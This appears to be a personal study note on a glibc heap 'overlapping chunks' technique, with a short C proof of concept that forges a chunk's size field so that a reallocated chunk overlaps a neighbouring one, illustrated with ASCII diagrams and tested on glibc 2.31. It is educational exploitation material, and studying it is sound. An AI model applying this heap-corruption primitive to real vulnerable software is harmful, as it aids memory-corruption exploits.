# Overlapping chunks version 2
> LongChampion, 18/03/2020

Yes, another overlapping attack. This attack is a bit harder than version 1, but is is easier than *poison null byte*.
```
#include <stdlib.h>
#define PREV_INUSE 0x01

struct Chunk
{
    long long pre_size, size;
    struct Chunk *fd, *bk;
};

int main()
{
    void *p1, *p2, *p3, *p4, *p5;
    p1 = malloc(0x100 - 8);
    p2 = malloc(0x100 - 8);
    p3 = malloc(0x100 - 8);
    p4 = malloc(0x100 - 8);
    p5 = malloc(0x100 - 8);

    free(p4);
    struct Chunk *Header = (struct Chunk *) (p2 - 0x10);
    Header->size = 0x200 | PREV_INUSE;
    free(p2);

    p2 = malloc(0x300 - 8);
}
```
This is visualization:
> After allocation:
```
    +-------------+-------------+-------------+-------------+-------------+
    |      1      |      2      |      3      |      4      |      5      |
    +-------------+-------------+-------------+-------------+-------------+

```
> Free chunk `4`:
```
    +-------------+-------------+-------------+             +-------------+
    |      1      |      2      |      3      |             |      5      |
    +-------------+-------------+-------------+             +-------------+
```
> Change size of chunk `2`, then free it:
```
    +-------------+             +-------------+             +-------------+
    |      1      |             |      3      |             |      5      |
    +-------------+             +-------------+             +-------------+
```
> Allocate chunk `2` again (with larger size):
```
    +-------------+-------------#>>>>>>>>>>>>>#-------------+-------------+
    |      1      |      2      [   2 and 3   ]      2      |      5      |
    +-------------+-------------#<<<<<<<<<<<<<#-------------+-------------+
```

# Note
- This attack still work with glibc 2.31 (I have tested this), but doesn't work against fastbin and tcache_bin.
- Chunk `5` is important: without it we can't free chunk `4`.
- The `PREV_INUSE` flag in chunk `2` fake size is important, too.
